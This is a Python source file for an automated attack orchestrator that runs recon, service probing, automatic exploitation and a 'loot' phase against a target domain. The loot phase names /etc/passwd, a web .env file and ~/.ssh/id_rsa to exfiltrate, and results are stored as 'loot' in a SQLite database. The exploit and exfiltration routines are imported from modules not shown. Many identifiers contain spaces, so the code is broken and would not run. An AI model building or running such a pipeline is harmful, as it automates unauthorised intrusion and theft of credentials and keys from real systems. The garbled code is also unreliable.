import sqlite3
import os
import json
import logging
from datetime import datetime
from nexttoken import NextToken

client = NextToken()
DB_DIR = "YOUSEF SHTIWE_AGENT/data/db"
DB_PATH = os.path.join(DB_DIR, "yousef shtiwe_intel.db")

def _init_db():
    os.makedirs(DB_DIR, exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("""
        CREATE TABLE IF NOT EXISTS targets (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            domain TEXT UNIQUE,
            status TEXT,
            last_audit TEXT
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS intel (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            target_id INTEGER,
            type TEXT, -- 'subdomain', 'email', 'vuln', 'loot'
            content TEXT,
            timestamp TEXT DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(target_id) REFERENCES targets(id)
        )
    """)
    conn.commit()
    return conn

class Yousef ShtiweOrchestrator:
    """The Master Mind: Autonomous Mission Execution."""
    def __init__(self, target_domain):
        self.target = target_domain
        self.db = _init_db()
        self._register_target()

    def _register_target(self):
        cursor = self.db.cursor()
        cursor.execute("INSERT OR IGNORE INTO targets (domain, status) VALUES (?, ?)", (self.target, "INITIALIZING"))
        self.db.commit()

    def run_autonomous_mission(self):
        """Execute Full Cyber Kill Chain automatically."""
        steps = [
            ("RECON", self._recon_phase),
            ("PROBE", self._probe_phase),
            ("EXPLOIT", self._exploit_phase),
            ("LOOT", self._loot_phase),
            ("REPORT", self._report_phase)
        ]
        
        for name, phase in steps:
            print(f"[YOUSEF SHTIWE-AI] Entering Phase: {name}")
            phase()
        
        print("[YOUSEF SHTIWE-AI] Mission Success. System Purged.")

    def _recon_phase(self):
        from tools.devops.stealth_recon import yousef shtiwe_recon_subdomains, yousef shtiwe_recon_emails
        subs = yousef shtiwe_recon_subdomains(self.target)
        emails = yousef shtiwe_recon_emails(self.target)
        self._save_intel("subdomain", subs)
        self._save_intel("email", emails)

    def _probe_phase(self):
        from tools.devops.probing import probe_service
        banner = probe_service(self.target, 80)
        self._save_intel("vuln", {"banner": banner})

    def _exploit_phase(self):
        """AI-Driven Exploitation: Query PoCs and execute via Ghost Engine."""
        from tools.devops.yousef shtiwe_v4_core import yousef shtiwe_auto_exploit_engine
        cursor = self.db.cursor()
        cursor.execute("SELECT content FROM intel WHERE target_id = (SELECT id FROM targets WHERE domain=?) AND type='vuln'", (self.target,))
        vuln_data = cursor.fetchone()
        if vuln_data:
            banner = json.loads(vuln_data[0]).get('banner', '')
            print(f"[*] Analyzing Vulnerability: {banner}")
            pocs = yousef shtiwe_auto_exploit_engine(banner)
            self._save_intel("exploit_pocs", pocs)

    def _loot_phase(self):
        """Active Looting: Exfiltrate sensitive files via Void Walker Engine."""
        from tools.devops.yousef shtiwe_void_walker import yousef shtiwe_loot_file
        critical_files = ["/etc/passwd", "/var/www/html/.env", "~/.ssh/id_rsa"]
        loot_results = []
        for file_path in critical_files:
            print(f"[!] Attempting to loot: {file_path}")
            res = yousef shtiwe_loot_file(self.target, file_path)
            loot_results.append(res)
        self._save_intel("loot", loot_results)

    def _report_phase(self):
        from tools.devops.reporter import generate_yousef shtiwe_report
        # Fetch all from DB
        cursor = self.db.cursor()
        cursor.execute("SELECT type, content FROM intel WHERE target_id = (SELECT id FROM targets WHERE domain=?)", (self.target,))
        findings = cursor.fetchall()
        generate_yousef shtiwe_report(self.target, {"raw_db_intel": findings})

    def _save_intel(self, intel_type, data):
        cursor = self.db.cursor()
        target_id = cursor.execute("SELECT id FROM targets WHERE domain=?", (self.target,)).fetchone()[0]
        cursor.execute("INSERT INTO intel (target_id, type, content) VALUES (?, ?, ?)", (target_id, intel_type, json.dumps(data)))
        self.db.commit()
